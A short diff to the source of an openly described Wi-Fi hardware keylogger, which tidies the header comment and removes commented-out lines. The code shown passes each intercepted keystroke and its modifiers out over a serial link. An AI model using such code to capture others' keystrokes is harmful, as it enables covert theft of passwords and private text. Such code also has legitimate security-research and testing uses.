@@ -1,7 +1,7 @@
 /*
  *  Basic hardware keylogger WiFi
  *
- *  Explanation: Simple hardware keylogger with wireless connectivity (WiFi) with multiple layout support.
+ *  Explanation: Simple Wi-Fi keylogger with multiple layout support.
  * 
  *  Copyright (C) 2019 Joel Serna & Ernesto Sanchez
  *
@@ -69,11 +69,9 @@ class KbdRptParser : public KeyboardReportParser {
 void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key) {
   
   SetModifiers();
-  //Keyboard.rawrelease(key, 0);
   Serial1.print(key);
   Serial1.print(" ");
   Serial1.println(modifiers);
-  //Serial1.println(key|modifiers);
 }
 
 void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key) { 
@@ -127,7 +125,6 @@ KbdRptParser Prs;
 void setup() {
   Serial1.begin(9600);
   
-  //Serial.print("Serial hardware iniciado");
   #if !defined(__MIPSEL__)
     while (!Serial1); // Wait for serial port to connect - used on Leonardo, Teensy and other boards with built-in USB CDC serial connection
   #endif
